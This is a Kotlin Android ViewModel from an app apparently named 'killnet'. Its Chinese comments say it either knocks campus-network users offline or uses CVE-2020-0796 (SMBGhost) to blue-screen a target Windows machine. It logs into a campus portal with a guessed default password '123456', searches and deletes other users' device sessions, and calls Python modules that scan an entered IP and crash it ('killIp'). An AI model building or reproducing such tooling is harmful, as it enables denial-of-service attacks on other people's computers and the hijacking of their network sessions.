package com.che.killnet.wenet

import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Handler
import android.util.Log
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.Transformations
import androidx.lifecycle.ViewModel
import com.blankj.utilcode.util.NetworkUtils
import com.chaquo.python.Python
import com.che.killnet.MyApplication.Companion.context
import com.che.killnet.wenet.model.DeleteBean
import com.che.killnet.wenet.model.LoginPostBody
import kotlinx.coroutines.*
import kotlin.concurrent.thread


class WenetViewModel: ViewModel() {

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    //   检测网络

    val buttonState = MutableLiveData<String>()


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//    搜索设备


    var searchDeviceLiveData = MutableLiveData<String>()

//    var deviceList = ArrayList<SearchSessionsResponse.Sessions>()
    /**
     * 登陆设备检查
     */
    val deviceLiveData = Transformations.switchMap(searchDeviceLiveData) { authorization ->
        Repository.searchDevices(authorization)
    }

    //登陆时赋值
    val authorization = MutableLiveData<String>()
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//    登陆设备


    val name = MutableLiveData("")





    /**
     * 登陆校园网
     */

    //根据输入的内容来决定使用哪个功能，1.loginWenet断校园网 2.利用cve-2020-0796蓝屏
    fun switchFunction() {
        val inputString = name.value!!
        if ("." in inputString)
            cve(inputString)
        else
            loginWenet()




    }

    val ifVulnerableLiveData = MutableLiveData<Boolean>()

    /*
    利用cve-2020-0796蓝屏,执行python代码
     */
    val py = Python.getInstance()

    private fun cve(inputString: String) {
        // 调用python代码
        var ifVulnerable = false

//            ifVulnerable = false
//            ifVulnerableLiveData.value = ifVulnerable

//            ifVulnerable = py.getModule("cve-2020-0796-scanner").callAttr("scannerIp",inputString).toBoolean()


        object : Thread() {
            override fun run() {
                try {
                    ifVulnerable = py.getModule("cve-2020-0796-scanner").callAttr("scannerIp",inputString).toBoolean()
                    ifVulnerableLiveData.postValue(ifVulnerable)
                } catch (e: Exception) {
                }

            }
        }.start()

        Handler().postDelayed({
            if(!ifVulnerable){
                ifVulnerableLiveData.value = ifVulnerable
                Log.e("cve", "$ifVulnerable")

            }
        }, 300)

        Log.e("cve", "continue")



    }

    fun crashTarget(inputString: String) {
        object : Thread() {
            override fun run() {
                try {
                    py.getModule("cve-2020-0796-crash").callAttr("killIp",inputString)
                } catch (e: Exception) {
                }

            }
        }.start()


    }

    fun loginWenet() {

        //根据ip修改连接
//        var url =
//            "http://10.16.0.12:8081/?usermac=XX:XX:XX:XX:XX:XX&userip=MYIP&origurl=http://edge.microsoft.com/captiveportal/generate_204&nasip=10.100.0.1"
        var url =
            "http://10.16.0.21/?usermac=XX:XX:XX:XX:XX:XX&userip=MYIP&origurl=http://edge.microsoft.com/captiveportal/generate_204&nasip=10.100.0.1"

        val loginPostBody = LoginPostBody(
            redirectUrl = url,
            webAuthUser = name.value!!,
            webAuthPassword = "123456"
        )

        Log.d("test123", "loginWenet:点击登录 $loginPostBody")

        loginDevices(loginPostBody)

    }

    private var loginDeviceLiveData = MutableLiveData<LoginPostBody>()

    val loginLiveData = Transformations.switchMap(loginDeviceLiveData) { loginPostBody ->
        Repository.loginDevices(loginPostBody)
    }

    fun loginDevices(loginPostBody: LoginPostBody) {
        loginDeviceLiveData.value = loginPostBody
    }

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//    删除设备


    private val deleteDeviceLiveData = MutableLiveData<DeleteBean>()


    val deleteLiveData = Transformations.switchMap(deleteDeviceLiveData) {
        Repository.deleteDevice(it.authorization, it.deviceId)
    }

    fun deleteDevice(authorization: String, deviceId: String) {
        val deleteBean = DeleteBean(authorization, deviceId)
        deleteDeviceLiveData.value = deleteBean
    }


}